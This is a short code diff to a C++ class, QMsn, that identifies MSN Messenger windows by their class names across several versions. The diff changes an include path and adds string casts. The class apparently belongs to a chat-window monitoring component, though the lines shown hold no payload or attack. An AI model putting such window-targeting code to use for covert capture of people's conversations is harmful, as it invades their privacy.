@@ -13,7 +13,7 @@ using namespace std;
 
 #include "QMsn.h"
 #include "QAgent.h"
-#include "..\common.h"
+#include "../../H4DLL/common.h"
 QMsn::QMsn()
 {
 	hwChat = hwUserList = hwLogin = hwContacts = hwHistory = NULL;
@@ -31,25 +31,25 @@ BOOL QMsn::Is(HWND hw)
 
 	// Msn
 	PWCHAR pwClass[] = {
-		L"IMWindowClass",
-		L"DirectUIHWND",
+		(PWCHAR)L"IMWindowClass",
+		(PWCHAR)L"DirectUIHWND",
 		0,
 	};
 
 	// Msn Live 2009
 	PWCHAR pwClass2009[] = {
-		L"IMWindowClass",
-		L"IM Window Class",
-		L"DirectUIHWND",
+		(PWCHAR)L"IMWindowClass",
+		(PWCHAR)L"IM Window Class",
+		(PWCHAR)L"DirectUIHWND",
 		0,
 	};
 
 	// Msn Live 2011
 	PWCHAR pwClass2011[] = {
-		L"TabbedHostWndClass",
-		L"WLXDUI",
-		L"CtrlNotifySink",
-		L"MsgrViewHost View Host",
+		(PWCHAR)L"TabbedHostWndClass",
+		(PWCHAR)L"WLXDUI",
+		(PWCHAR)L"CtrlNotifySink",
+		(PWCHAR)L"MsgrViewHost View Host",
 		0,
 	};
 
@@ -187,5 +187,5 @@ UINT QMsn::VersionEx(const HWND hw)
 
 const PWCHAR QMsn::GetMessenger()
 { 
-	return L"MSN"; 
+	return (PWCHAR)L"MSN";
 }
